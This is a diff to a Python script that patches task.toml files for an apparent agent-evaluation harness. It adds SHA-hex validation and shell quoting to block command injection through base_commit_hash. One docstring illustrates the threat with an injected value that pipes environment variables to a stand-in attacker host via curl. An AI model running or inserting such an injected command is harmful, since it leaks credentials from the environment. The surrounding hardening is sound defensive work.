@@ -31,19 +31,44 @@ Usage::
 from __future__ import annotations
 
 import re
+import shlex
 import sys
 from pathlib import Path
 
 import tomllib
 
+_SHA_HEX_RE = re.compile(r"^[0-9a-fA-F]{40}$|^[0-9a-fA-F]{64}$")
+"""Strict allowlist for base_commit_hash: 40-char SHA-1 or 64-char SHA-256."""
+
+
+def _validate_base_commit(base_commit: str) -> str:
+    """Return base_commit if it matches a strict SHA hex pattern, else raise.
+
+    The value is interpolated into a shell command that Harbor later executes
+    in the agent container, so it must not contain arbitrary characters. A
+    malicious task.toml could otherwise inject shell commands (e.g.
+    ``HEAD; env | curl -d @- https://attacker.example``) that run with the
+    agent's credentials and network access.
+    """
+    if not _SHA_HEX_RE.match(base_commit):
+        raise ValueError(
+            f"base_commit_hash must be a 40 or 64 character hex SHA, "
+            f"got: {base_commit!r}"
+        )
+    return base_commit
+
 
 def _collect_command(base_commit: str) -> str:
     """Shell command that reproduces pre_artifacts.sh as a collect hook."""
+    # shlex.quote is belt-and-suspenders: _validate_base_commit already
+    # guarantees a hex-only string, but quoting defends against future
+    # changes to the validation logic.
+    safe_commit = shlex.quote(base_commit)
     return (
         "cd /app || exit 0; "
         "mkdir -p /logs/artifacts; "
         "git config --global --add safe.directory /app 2>/dev/null || true; "
-        f"git diff --binary {base_commit} HEAD > /logs/artifacts/model.patch "
+        f"git diff --binary {safe_commit} HEAD > /logs/artifacts/model.patch "
         "2>/dev/null || true; "
         'echo "[pre_artifacts] captured $(wc -c < /logs/artifacts/model.patch) bytes"'
     )
@@ -76,6 +101,11 @@ def patch_task_toml(path: Path) -> str:
     base_commit = metadata.get("base_commit_hash")
     if not base_commit:
         return f"SKIP (no base_commit_hash): {path.name}"
+
+    try:
+        base_commit = _validate_base_commit(base_commit)
+    except ValueError as exc:
+        return f"SKIP (invalid base_commit_hash): {exc}"
 
     changed = False
 
